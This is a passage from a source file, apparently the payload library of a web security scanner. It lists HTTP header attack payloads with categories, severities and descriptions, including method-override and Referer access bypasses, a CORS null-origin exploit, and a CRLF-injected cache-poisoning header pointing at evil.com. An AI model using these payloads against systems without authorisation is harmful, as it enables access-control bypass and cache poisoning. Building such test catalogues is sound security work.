      p("X-HTTP-Method-Override: PUT", "Method override bypass", "Access Bypass", "high", "Change request method via header to bypass method-based controls"),
      p("Origin: null", "CORS null origin bypass", "CORS", "high", "Exploit misconfigured CORS that allows null origin"),
      p("X-Forwarded-Proto: https", "Protocol upgrade bypass", "Access Bypass", "medium", "Bypass HTTPS-only checks by spoofing protocol header"),
      p("Cache-Control: no-transform\\r\\nX-Forwarded-Host: evil.com", "Web cache poisoning", "Cache Poisoning", "high", "Poison web cache with attacker-controlled host header"),
      p("Referer: https://admin.target.com", "Referer-based bypass", "Access Bypass", "medium", "Bypass access controls that check Referer header"),
      p("Accept: application/xml", "Content negotiation to XXE", "Content Type", "medium", "Switch content negotiation to XML to test for XXE"),
    ],
  },
];

export const TOTAL_PAYLOADS = PAYLOAD_CATEGORIES.reduce((sum, cat) => sum + cat.payloads.length, 0);
